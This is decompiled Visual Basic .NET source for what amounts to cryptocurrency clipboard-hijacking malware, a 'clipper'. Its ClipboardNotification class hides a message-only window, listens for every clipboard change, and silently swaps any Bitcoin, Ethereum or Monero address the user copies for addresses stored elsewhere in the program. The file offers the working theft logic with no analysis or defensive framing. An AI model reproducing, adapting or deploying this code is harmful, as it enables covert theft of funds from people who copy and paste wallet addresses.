Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Runtime.CompilerServices
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace Crypto.Crypto
	' Token: 0x02000011 RID: 17
	Public NotInheritable Class ClipboardNotification
		' Token: 0x06000038 RID: 56 RVA: 0x00002C94 File Offset: 0x00000E94
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x02000012 RID: 18
		Public Class NotificationForm
			Inherits Form

			' Token: 0x0600003A RID: 58 RVA: 0x00002CB8 File Offset: 0x00000EB8
			<DebuggerNonUserCode()>
			Private Shared Sub __ENCAddToList(value As Object)
				Dim _ENCList As List(Of WeakReference) = ClipboardNotification.NotificationForm.__ENCList
				Dim flag As Boolean = False
				Try
					Monitor.Enter(_ENCList, flag)
					Dim flag2 As Boolean = ClipboardNotification.NotificationForm.__ENCList.Count = ClipboardNotification.NotificationForm.__ENCList.Capacity
					If flag2 Then
						Dim num As Integer = 0
						Dim num2 As Integer = 0
						Dim num3 As Integer = ClipboardNotification.NotificationForm.__ENCList.Count - 1
						Dim num4 As Integer = num2
						While True
							Dim num5 As Integer = num4
							Dim num6 As Integer = num3
							If num5 > num6 Then
								Exit Sub
							End If
							Dim weakReference As WeakReference = ClipboardNotification.NotificationForm.__ENCList(num4)
							flag2 = weakReference.IsAlive
							If flag2 Then
								Dim flag3 As Boolean = num4 <> num
								If flag3 Then
									ClipboardNotification.NotificationForm.__ENCList(num) = ClipboardNotification.NotificationForm.__ENCList(num4)
								End If
								num += 1
							End If
							num4 += 1
						End While
						ClipboardNotification.NotificationForm.__ENCList.RemoveRange(num, ClipboardNotification.NotificationForm.__ENCList.Count - num)
						ClipboardNotification.NotificationForm.__ENCList.Capacity = ClipboardNotification.NotificationForm.__ENCList.Count
					End If
					ClipboardNotification.NotificationForm.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
				Finally
					Dim flag3 As Boolean = flag
					If flag3 Then
						Monitor.[Exit](_ENCList)
					End If
				End Try
			End Sub

			' Token: 0x0600003B RID: 59 RVA: 0x00002DC8 File Offset: 0x00000FC8
			Public Sub New()
				ClipboardNotification.NotificationForm.__ENCAddToList(Me)
				NativeMethods.SetParent(Me.Handle, NativeMethods.HWND_MESSAGE)
				NativeMethods.AddClipboardFormatListener(Me.Handle)
			End Sub

			' Token: 0x0600003C RID: 60 RVA: 0x00002DF8 File Offset: 0x00000FF8
			Private Function RegexResult(pattern As Regex) As Boolean
				Return pattern.Match(ClipboardNotification.NotificationForm.currentClipboard).Success
			End Function

			' Token: 0x0600003D RID: 61 RVA: 0x00002E28 File Offset: 0x00001028
			Protected Overrides Sub WndProc(ByRef m As Message)
				Dim flag As Boolean = m.Msg = 797
				If flag Then
					ClipboardNotification.NotificationForm.currentClipboard = Clipboard.GetText()
					flag = (Operators.CompareString(Addresses.btcE, "yes", False) = 0)
					Dim flag2 As Boolean
					If flag Then
						flag2 = (Me.RegexResult(PatternRegex.btc) AndAlso Not ClipboardNotification.NotificationForm.currentClipboard.Contains(Addresses.btc))
						If flag2 Then
							Dim text As String = PatternRegex.btc.Replace(ClipboardNotification.NotificationForm.currentClipboard, Addresses.btc)
							Clipboard.SetText(text)
						End If
					End If
					flag2 = (Operators.CompareString(Addresses.ethereumE, "yes", False) = 0)
					If flag2 Then
						flag = (Me.RegexResult(PatternRegex.ethereum) AndAlso Not ClipboardNotification.NotificationForm.currentClipboard.Contains(Addresses.ethereum))
						If flag Then
							Dim text2 As String = PatternRegex.ethereum.Replace(ClipboardNotification.NotificationForm.currentClipboard, Addresses.ethereum)
							Clipboard.SetText(text2)
						End If
					End If
					flag2 = (Operators.CompareString(Addresses.xmrE, "yes", False) = 0)
					If flag2 Then
						flag = (Me.RegexResult(PatternRegex.xmr) AndAlso Not ClipboardNotification.NotificationForm.currentClipboard.Contains(Addresses.xmr))
						If flag Then
							Dim text3 As String = PatternRegex.xmr.Replace(ClipboardNotification.NotificationForm.currentClipboard, Addresses.xmr)
							Clipboard.SetText(text3)
						End If
					End If
				End If
				MyBase.WndProc(m)
			End Sub

			' Token: 0x0400001C RID: 28
			Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

			' Token: 0x0400001D RID: 29
			Private Shared currentClipboard As String = Clipboard.GetText()
		End Class
	End Class
End Namespace
